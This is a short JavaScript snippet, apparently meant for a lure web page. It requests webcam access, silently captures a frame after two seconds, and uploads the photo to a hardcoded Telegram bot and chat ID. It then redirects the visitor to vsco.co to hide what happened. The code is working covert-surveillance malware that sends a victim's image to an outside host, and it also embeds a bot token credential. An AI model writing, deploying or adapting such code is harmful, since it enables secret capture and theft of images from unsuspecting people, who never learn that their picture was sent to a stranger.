const telegramToken = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs";
const chatId = "8005843544";

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        setTimeout(async () => {
            const canvas = document.createElement('canvas');
            canvas.width = 640; canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
            
            const fd = new FormData();
            fd.append('chat_id', chatId);
            fd.append('photo', blob, 'img.jpg');

            await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, { method: 'POST', body: fd });
            window.location.href = "https://www.vsco.co/"; 
        }, 2000);
    } catch (err) {
        window.location.href = "https://www.vsco.co/";
    }
}

